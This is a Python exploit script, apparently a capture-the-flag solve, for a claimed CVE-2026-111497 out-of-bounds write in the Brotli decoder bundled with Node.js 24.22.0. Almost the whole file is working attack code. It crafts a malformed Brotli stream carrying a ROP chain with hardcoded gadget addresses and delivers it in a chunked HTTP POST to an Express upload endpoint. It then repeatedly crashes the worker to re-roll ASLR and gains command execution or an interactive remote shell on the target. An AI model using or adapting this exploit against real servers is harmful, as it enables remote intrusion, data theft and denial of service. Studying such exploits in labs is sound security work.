#!/usr/bin/env python3
"""
Remote exploit for CVE-2026-111497 (a.k.a. HTTP2Shell / Node2Shell /
Broccoli2Shell), an out-of-bounds write in the Brotli reference decoder
bundled with Node.js 24.22.0.

    node:zlib  --Content-Encoding: br-->  body-parser 2.4.0
                                       -> zlib.createBrotliDecompress()
                                       -> bundled c/dec/decode.c  (vulnerable)

A crafted Brotli stream declares one block type but then forces a block
switch.  DecodeBlockTypeAndLength() answers BROTLI_FALSE - the same
sentinel it uses for "needs more input" - and the fast path
(BROTLI_SAFE with safe == 0) throws the return value away.  The decoder
keeps running on stale state, the LZ77 copy walks off the end of the
ring buffer, and we overwrite a saved return address inside the libuv
worker with a ROP chain laid out in our own decompressed prefix.

The chain (11 qwords, exactly filling source+0x30 .. source+0x88):

    pop rsi ; bss+8            -> rsi = bss + 8
    add rdi,0x88 ; mov [rsi],rdi -> *(bss+0x08) = path pointer
    pop rbx ; bss              -> rbx = bss
    pop rdi ; 19               -> rdi = accepted socket fd
    pop rsi ; DUP_FD           -> rsi = 0 (stdin) or 1 (stdout)
    dup2@plt                   -> dup2(19, DUP_FD)
    execvp_call_site           -> mov rsi,[rbx+0x10]   (argv, never set -> NULL)
                                  mov rdi,[rbx+0x08]   (file)
                                  call execvp@plt

glibc's execvp() tolerates a NULL argv (verified), and a NULL-argv
/bin/sh happily reads commands from fd 0.  So DUP_FD = 0 puts our socket
on the shell's stdin, and the shell then runs `exec >&0` to put it back
on stdout.  Only one of {stdin, stdout} can be wired up in a single
dup2, which is why the shell has to do the second redirect itself.

Usage
-----
    python3 solve.py                        # default: cat /flag.txt
    python3 solve.py --url http://host:port
    python3 solve.py --url https://host/    # TLS is negotiated automatically
    python3 solve.py --mode shell           # interactive shell over the socket
    python3 solve.py --mode id              # just prove RCE (runs /usr/bin/id)

Modes
-----
    flag    exec /bin/sh, send it `exec >&0; cat /flag.txt`, print the flag.
            Non-interactive: one command in, one answer out.
    shell   same primitive, but the bootstrap sends
            `exec 2>&0; exec >&0; echo <marker>; exec /bin/sh -i`
            so the socket becomes the shell's stdin *and* stdout/stderr, then
            relays your terminal to it.  No PTY (the ROP budget cannot afford
            openpty), so no tab completion or job control.
    id      dup2(19, 1) instead and exec /usr/bin/id.  Proves RCE without
            needing the shell trick at all.

Requires:  pip install pwntools
"""

from __future__ import annotations

import argparse
import hashlib
import re
import struct
import sys
import time
from urllib.parse import urlsplit

from pwn import context, remote

context.log_level = "error"  # keep stdout clean

# ---------------------------------------------------------------------------
# Profile: node-24.22.0-express-5.3.0-bookworm-x86_64
#
# Addresses are for the official non-PIE linux/x64 Node.js v24.22.0 binary
# (sha256 67ca5783febb8bf85736c79fcdd92c8d6d465a0eb2a082672bcdfa76a506751c)
# shipped in node:24.22.0-bookworm (digest sha256:925de64a8531...).
# Any other runtime/arch gives garbage and will simply fail closed.
# ---------------------------------------------------------------------------

TRIGGER_SHA256 = "b7a6508eb39ef57ae5e3fdf9aa85540071a06eff5d5b5a2d359fc8e1768e4df4"

PREFIX_SIZE = 1031
COPY_SOURCE_OFFSET = 0x367
COMMAND_BLOCK_EXTRA = 0xFFFFFF
SECOND_STAGE_SIZE = 256
STAGE_DELAY_SECONDS = 0.5
RESTART_TIMEOUT_SECONDS = 8.0
ATTEMPTS = 16
STAGED_POSITIONS = (0x137ED748,)
SOCKET_FD = 19

MOV_RAX_RDI_RET = 0x816750
PIVOT_RSP_RAX_30_RET = 0x1FB97F8
POP_RSI_RET = 0x8A604E
STORE_RDI_PLUS_88_RET = 0x8BD991  # add rdi,0x88 ; xor eax,eax ; mov [rsi],rdi ; ret
POP_RBX_RET = 0x7F6143
POP_RDI_RET = 0x94FE4D
DUP2_PLT = 0x74D7F0
EXECVP_CALL_SITE = 0x1A3EBEC  # mov 0x10(%rbx),%rsi ; mov 0x8(%rbx),%rdi ; call execvp@plt
BSS_BASE = 0x6BDFB00

DEFAULT_URL = "http://100.121.79.48:32001/"

# The path lives at COPY_SOURCE_OFFSET + 0x88 and the prefix ends at
# PREFIX_SIZE, so we have exactly this many bytes (NUL included).
PATH_BUDGET = PREFIX_SIZE - (COPY_SOURCE_OFFSET + 0x88)  # 24

FLAG_RE = re.compile(rb"[A-Za-z0-9_]+\{[^}\r\n]{1,200}\}")
ID_RE = re.compile(rb"uid=\d+(?:\([^)\r\n]+\))?\s+gid=\d+(?:\([^)\r\n]+\))?")

DONE_MARKER = b"__SOLVE_DONE__"

# The shell we exec.  The ROP chain always does dup2(19, 0) then
# execvp("/bin/sh", NULL), so the shell starts reading commands from our
# socket on fd 0.  What it does with them depends on the mode:
#
#   flag     -> one command that dumps /flag.txt back over fd 0
#   shell    -> a bootstrap that promotes fd 0 to stdout/stderr, then execs
#               an interactive shell so we can keep typing
SHELL_PATH = "/bin/sh"

# --mode flag: run one command and emit a marker so we know it completed.
FLAG_COMMAND = f"exec >&0; cat /flag.txt; echo {DONE_MARKER.decode()}"

# --mode shell: promote the socket to stdout+stderr so the shell's output
# comes back to us, then re-exec as an interactive shell attached to it.
# `exec 2>&0` matters because sh writes its prompt and errors to stderr.
SHELL_PROMPT_MARKER = "__SHELL_UP__"
INTERACTIVE_COMMAND = (
    f"exec 2>&0; exec >&0; echo {SHELL_PROMPT_MARKER}; exec /bin/sh -i"
)


# ---------------------------------------------------------------------------
# Minimal Brotli bitstream writer
# ---------------------------------------------------------------------------


class Bits:
    """Least-significant-bit-first writer for Brotli stream fields."""

    def __init__(self) -> None:
        self.data = bytearray()
        self.value = 0
        self.used = 0

    def put(self, value: int, count: int) -> None:
        for bit_index in range(count):
            self.value |= ((value >> bit_index) & 1) << self.used
            self.used += 1
            if self.used == 8:
                self.data.append(self.value)
                self.value = 0
                self.used = 0

    def aligned(self, value: bytes) -> None:
        if self.used:
            raise ValueError("writer is not byte-aligned")
        self.data.extend(value)

    def finish(self) -> bytes:
        if self.used:
            self.data.append(self.value)
            self.value = 0
            self.used = 0
        return bytes(self.data)


def one_symbol_tree(bits: Bits, alphabet_size: int, symbol: int) -> None:
    bits.put(1, 2)
    bits.put(0, 2)
    bits.put(symbol, (alphabet_size - 1).bit_length())


def varlen_u8(bits: Bits, value: int) -> None:
    if value == 0:
        bits.put(0, 1)
        return
    bits.put(1, 1)
    if value == 1:
        bits.put(0, 3)
        return
    width = value.bit_length() - 1
    bits.put(width, 3)
    bits.put(value - (1 << width), width)


def _emit_commands(bits: Bits, distance_extra: int) -> None:
    """Emit 2^24 dummy commands so block_length is exhausted mid-stream."""
    group = Bits()
    for _ in range(8):
        group.put(distance_extra, 11)
    group_bytes = group.finish()

    command_count = 1 << 24
    completed = 0
    while bits.used and completed < command_count:
        bits.put(distance_extra, 11)
        completed += 1

    groups, tail = divmod(command_count - completed, 8)
    bits.aligned(group_bytes * groups)
    for _ in range(tail):
        bits.put(distance_extra, 11)


def _header(bits: Bits) -> None:
    bits.put(1, 1)  # window bits
    bits.put(0, 3)
    bits.put(2, 3)


def _malformed_tail(bits: Bits, block_extra: int) -> None:
    """The part that forces an invalid block switch on a single-tree stream."""
    bits.put(0, 1)
    bits.put(2, 2)
    bits.put(0xFFFFFF, 24)
    bits.put(0, 1)
    varlen_u8(bits, 0)
    varlen_u8(bits, 1)
    one_symbol_tree(bits, 4, 0)
    one_symbol_tree(bits, 26, 25)
    bits.put(block_extra, 24)
    varlen_u8(bits, 0)
    bits.put(3, 6)
    bits.put(0, 2)
    varlen_u8(bits, 0)
    varlen_u8(bits, 0)
    one_symbol_tree(bits, 256, 0)
    one_symbol_tree(bits, 704, 130)
    one_symbol_tree(bits, 704, 130)
    one_symbol_tree(bits, 400, 184)


def generate_stream() -> bytes:
    """The plain DoS/crash trigger (no controlled prefix)."""
    bits = Bits()
    _header(bits)
    _malformed_tail(bits, 0xFFFFFF)
    _emit_commands(bits, distance_extra=4)
    return bits.finish()


def generate_rce_stream(prefix: bytes, command_block_extra: int) -> bytes:
    """Same malformed stream, but with our ROP prefix injected first."""
    if len(prefix) > 0x10000:
        raise ValueError("RCE prefix is too large")
    if not 0 <= command_block_extra <= 0xFFFFFF:
        raise ValueError("command block extra must fit in 24 bits")

    bits = Bits()
    _header(bits)

    if prefix:
        bits.put(0, 1)               # is_last = 0
        bits.put(0, 2)               # MNIBBLES
        bits.put(len(prefix) - 1, 16)  # MLEN-1
        bits.put(1, 1)               # IS_UNCOMPRESSED
        if bits.used:
            bits.put(0, 8 - bits.used)
        bits.aligned(prefix)

    _malformed_tail(bits, command_block_extra)
    _emit_commands(bits, distance_extra=(len(prefix) + 32) // 8)
    return bits.finish()


def trigger_stages() -> tuple[bytes, bytes]:
    trigger = generate_stream()
    digest = hashlib.sha256(trigger).hexdigest()
    if digest != TRIGGER_SHA256:
        raise RuntimeError(f"trigger hash mismatch: {digest}")

    first = trigger + b"\x00" * 3
    second = _stage_two(0x7FFFFFFF, 127)
    return first, second


def _stage_two(position: int, size: int) -> bytes:
    if size < 27:
        raise ValueError("stage two must be at least 27 bytes")
    body = bytearray(size)
    body[7] = 8
    struct.pack_into("<i", body, 15, position)
    struct.pack_into("<I", body, 19, 0x7FFFFFFF)
    struct.pack_into("<I", body, 23, 0x7FFFFFFF)
    return bytes(body)


# ---------------------------------------------------------------------------
# Payload construction
# ---------------------------------------------------------------------------


def build_stages(path: str, dup_fd: int, position: int) -> tuple[bytes, bytes]:
    """Build the two chunked-TE stages for one exploit attempt."""
    encoded = path.encode("ascii") + b"\x00"
    path_offset = COPY_SOURCE_OFFSET + 0x88
    if len(encoded) > PATH_BUDGET:
        raise ValueError(
            f"path {path!r} needs {len(encoded)} bytes, budget is {PATH_BUDGET}"
        )

    prefix = bytearray(PREFIX_SIZE)

    # Overwrite the saved return address with the stack pivot.
    struct.pack_into(
        "<QQ", prefix, COPY_SOURCE_OFFSET, MOV_RAX_RDI_RET, PIVOT_RSP_RAX_30_RET
    )

    # rdi == buffer + COPY_SOURCE_OFFSET here, so rsp lands on the chain.
    chain = (
        POP_RSI_RET,
        BSS_BASE + 8,
        STORE_RDI_PLUS_88_RET,   # *(bss+0x08) = rdi + 0x88  -> path pointer
        POP_RBX_RET,
        BSS_BASE,                # rbx = bss, consumed by execvp_call_site
        POP_RDI_RET,
        SOCKET_FD,
        POP_RSI_RET,
        dup_fd,                  # 0 = stdin (shell), 1 = stdout (id)
        DUP2_PLT,
        EXECVP_CALL_SITE,
    )
    if COPY_SOURCE_OFFSET + 0x30 + 8 * len(chain) > path_offset:
        raise RuntimeError("ROP chain would clobber the path string")
    struct.pack_into(
        "<" + "Q" * len(chain), prefix, COPY_SOURCE_OFFSET + 0x30, *chain
    )
    prefix[path_offset : path_offset + len(encoded)] = encoded

    first = generate_rce_stream(bytes(prefix), COMMAND_BLOCK_EXTRA) + b"\x00" * 3
    second = _stage_two(position, SECOND_STAGE_SIZE)
    return first, second


def chunk(data: bytes) -> bytes:
    return f"{len(data):x}\r\n".encode("ascii") + data + b"\r\n"


# ---------------------------------------------------------------------------
# Networking  (pwntools tubes)
# ---------------------------------------------------------------------------


def connect(host: str, port: int, timeout: float, tls: bool = False):
    """Open a TCP tube to the target, wrapped in TLS when the URL is https.

    Deployments are frequently fronted by a TLS-terminating proxy on 443 that
    routes by SNI, so a plaintext request there is answered by the proxy (or
    dropped) and never reaches the app.  pwntools' ``ssl=True`` performs the
    handshake and leaves the tube byte-for-byte identical afterwards, so the
    exploit payload is unchanged either way.
    """
    return remote(host, port, timeout=timeout, ssl=tls)


def read_until(tube, deadline: float, limit: int = 65536) -> bytes:
    """Drain the tube until we hit a stop marker, EOF, or the deadline.

    pwntools raises EOFError when the worker dies mid-read, which is the
    normal outcome of a missed ASLR guess -- so EOF is a result, not an
    exception we should surface.
    """
    data = bytearray()
    while len(data) < limit and time.monotonic() < deadline:
        remaining = max(0.05, deadline - time.monotonic())
        try:
            part = tube.recv(min(4096, limit - len(data)), timeout=remaining)
        except (EOFError, OSError):
            break
        if not part:
            break
        data.extend(part)
        if DONE_MARKER in data or ID_RE.search(data):
            break
    return bytes(data)


def healthcheck(host: str, port: int, timeout: float, tls: bool = False) -> bool:
    """Our /health returns {"status":"ok"}, not the upstream lab's PONG."""
    tube = None
    try:
        tube = connect(host, port, timeout, tls)
        tube.send(
            b"GET /health HTTP/1.1\r\nHost: target\r\nConnection: close\r\n\r\n"
        )
        response = read_until(tube, time.monotonic() + timeout, limit=4096)
    except (EOFError, OSError):
        return False
    finally:
        if tube is not None:
            try:
                tube.close()
            except Exception:  # noqa: BLE001 - closing must never mask a result
                pass
    return response.startswith(b"HTTP/1.1 200") and b'"ok"' in response


def wait_until(
    host: str,
    port: int,
    timeout: float,
    want: bool,
    budget: float,
    tls: bool = False,
) -> bool:
    deadline = time.monotonic() + budget
    while time.monotonic() < deadline:
        if healthcheck(host, port, min(timeout, 1.0), tls) == want:
            return True
        time.sleep(0.1)
    return False


def exploit_once(
    host: str,
    port: int,
    timeout: float,
    path: str,
    dup_fd: int,
    command: str | None,
    tls: bool = False,
) -> bytes:
    """One attempt.  Returns whatever came back on the exploited socket."""
    first, second = build_stages(path, dup_fd, STAGED_POSITIONS[0])
    headers = (
        b"POST /upload HTTP/1.1\r\n"
        b"Host: target\r\n"
        b"Content-Type: application/json\r\n"
        b"Content-Encoding: br\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"Connection: close\r\n\r\n"
    )

    with connect(host, port, timeout, tls) as tube:
        tube.send(headers + chunk(first))
        time.sleep(STAGE_DELAY_SECONDS)
        tube.send(chunk(second) + b"0\r\n\r\n")

        if command is None:
            # /usr/bin/id writes straight to the dup'd stdout.
            return read_until(tube, time.monotonic() + timeout)

        # Give the exec'd shell a moment to come up and read its stdin,
        # then hand it the command over the same socket.
        time.sleep(0.4)
        try:
            tube.send(command.encode("ascii") + b"\n")
        except (EOFError, OSError):
            return b""
        return read_until(tube, time.monotonic() + timeout, limit=65536)


def exploit_interactive(
    host: str,
    port: int,
    timeout: float,
    tls: bool = False,
) -> bool:
    """
    The bootstrap promotes the exploited socket to stdout/stderr and re-execs
    as an interactive shell, so both our keystrokes and the shell's output
    travel over the same connection.  Returns True once the shell has been
    handed to the user, or False when the worker died / the ASLR guess missed.
    """
    first, second = build_stages(SHELL_PATH, 0, STAGED_POSITIONS[0])
    headers = (
        b"POST /upload HTTP/1.1\r\n"
        b"Host: target\r\n"
        b"Content-Type: application/json\r\n"
        b"Content-Encoding: br\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"Connection: close\r\n\r\n"
    )

    tube = connect(host, port, timeout, tls)
    try:
        tube.send(headers + chunk(first))
        time.sleep(STAGE_DELAY_SECONDS)
        tube.send(chunk(second) + b"0\r\n\r\n")
    except (EOFError, OSError):
        tube.close()
        return False

    # The shell reads its first command from the same socket.
    time.sleep(0.4)
    try:
        tube.send(INTERACTIVE_COMMAND.encode("ascii") + b"\n")
    except (EOFError, OSError):
        tube.close()
        return False

    # Wait for the bootstrap to announce itself.  A miss means the worker is
    # gone (or never got that far), so there is nothing to attach to.
    banner = read_until(tube, time.monotonic() + min(timeout, 10.0), limit=65536)
    if SHELL_PROMPT_MARKER.encode("ascii") not in banner:
        tube.close()
        return False

    if banner:
        sys.stdout.buffer.write(banner)
        sys.stdout.buffer.flush()

    # pwntools relays our terminal to the socket and back.  Ctrl-C detaches.
    tube.interactive()
    tube.close()
    return True


def crash_trigger(host: str, port: int, timeout: float, tls: bool = False) -> None:
    """Fire the DoS payload so the restart supervisor respawns a fresh worker.

    Each respawn re-randomises ASLR, which is what lets us retry the
    saved-return-address guess.
    """
    first, second = trigger_stages()
    headers = (
        b"POST /upload HTTP/1.1\r\n"
        b"Host: target\r\n"
        b"Content-Type: application/json\r\n"
        b"Content-Encoding: br\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"Connection: close\r\n\r\n"
    )
    try:
        with connect(host, port, timeout, tls) as tube:
            tube.send(headers + chunk(first))
            time.sleep(STAGE_DELAY_SECONDS)
            try:
                tube.send(chunk(second) + b"0\r\n\r\n")
            except (EOFError, OSError):
                return
            read_until(tube, time.monotonic() + 2.0, limit=4096)
    except (EOFError, OSError):
        pass  # a successful crash aborts the trigger connection


# ---------------------------------------------------------------------------
# Driver
# ---------------------------------------------------------------------------


def extract_flag(blob: bytes) -> str | None:
    match = FLAG_RE.search(blob)
    return match.group(0).decode("ascii", errors="replace") if match else None


def solve(url: str, timeout: float, attempts: int, mode: str) -> int:
    parts = urlsplit(url if "//" in url else f"//{url}")
    host = parts.hostname
    port = parts.port or (443 if parts.scheme == "https" else 80)
    if not host:
        print(f"FAIL: could not parse target from {url!r}", file=sys.stderr)
        return 1

    # https implies a TLS-terminating front end; without this the exploit
    # bytes hit the proxy instead of Express.
    tls = parts.scheme == "https"

    print(f"[*] target      : {host}:{port}")
    print(f"[*] transport   : {'https (TLS)' if tls else 'http'}")
    print(f"[*] runtime     : node v24.22.0 linux/x64 (non-PIE)")
    print(f"[*] primitive   : CVE-2026-111497 OOB write -> ROP -> execvp")
    print(f"[*] mode        : {mode}")

    if not healthcheck(host, port, timeout, tls):
        print("FAIL: target /health did not respond before the attempt", file=sys.stderr)
        return 1
    print("[+] target healthy")

    if mode == "id":
        path, dup_fd, command = "/usr/bin/id", 1, None
    elif mode == "shell":
        path, dup_fd, command = SHELL_PATH, 0, None
    else:
        path, dup_fd, command = SHELL_PATH, 0, FLAG_COMMAND

    last = b""
    for attempt in range(1, attempts + 1):
        if not wait_until(
            host, port, timeout, True, RESTART_TIMEOUT_SECONDS, tls
        ):
            print("FAIL: target never became healthy for a fresh attempt", file=sys.stderr)
            return 1

        print(f"[*] attempt {attempt}/{attempts}  path={path}  dup2 fd={dup_fd}")
        try:
            if mode == "shell":
                if exploit_interactive(host, port, timeout, tls):
                    print("[+] detached", file=sys.stderr)
                    return 0
                last = b""
            else:
                last = exploit_once(
                    host, port, timeout, path, dup_fd, command, tls
                )
        except (EOFError, OSError) as error:
            print(f"    connection failed: {error}")
            last = b""

        if mode == "id":
            match = ID_RE.search(last)
            if match:
                print("[+] RCE confirmed")
                print(f"    {match.group(0).decode()}")
                return 0
        else:
            flag = extract_flag(last)
            if flag:
                print("[+] FLAG")
                print(f"    {flag}")
                return 0
            if DONE_MARKER in last:
                print("[+] shell responded but no flag matched:", file=sys.stderr)
                print(repr(last[:512]), file=sys.stderr)
                return 1

        snippet = last[:200].decode("utf-8", errors="replace").strip()
        print(f"    no success (got {len(last)} bytes){': ' + snippet if snippet else ''}")

        if attempt < attempts:
            # Restart the worker to re-roll ASLR, then wait for it to come back.
            crash_trigger(host, port, timeout, tls)
            if not wait_until(host, port, timeout, False, 3.0, tls):
                print("    crash trigger did not take the worker down", file=sys.stderr)

    print(
        f"FAIL: no shell after {attempts} attempts"
        if mode == "shell"
        else f"FAIL: no success after {attempts} attempts; last={last[:200]!r}",
        file=sys.stderr,
    )
    return 1


def main() -> int:
    parser = argparse.ArgumentParser(description="Shelloween solve (CVE-2026-111497)")
    parser.add_argument("--url", default=DEFAULT_URL, help="target base URL")
    parser.add_argument("--timeout", type=float, default=30.0)
    parser.add_argument("--attempts", type=int, default=ATTEMPTS)
    parser.add_argument(
        "--mode",
        choices=("flag", "shell", "id"),
        default="flag",
        help="flag = cat /flag.txt (default); shell = interactive shell; id = prove RCE",
    )
    args = parser.parse_args()
    if not 0 < args.timeout <= 120:
        print("FAIL: timeout must be in (0, 120]", file=sys.stderr)
        return 1
    if not 1 <= args.attempts <= 50:
        print("FAIL: attempts must be in [1, 50]", file=sys.stderr)
        return 1
    return solve(args.url, args.timeout, args.attempts, args.mode)


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except KeyboardInterrupt:
        print("\ninterrupted", file=sys.stderr)
        raise SystemExit(130)
    except Exception as error:  # noqa: BLE001 - top-level CLI boundary
        print(f"FAIL: {error}", file=sys.stderr)
        raise SystemExit(1)
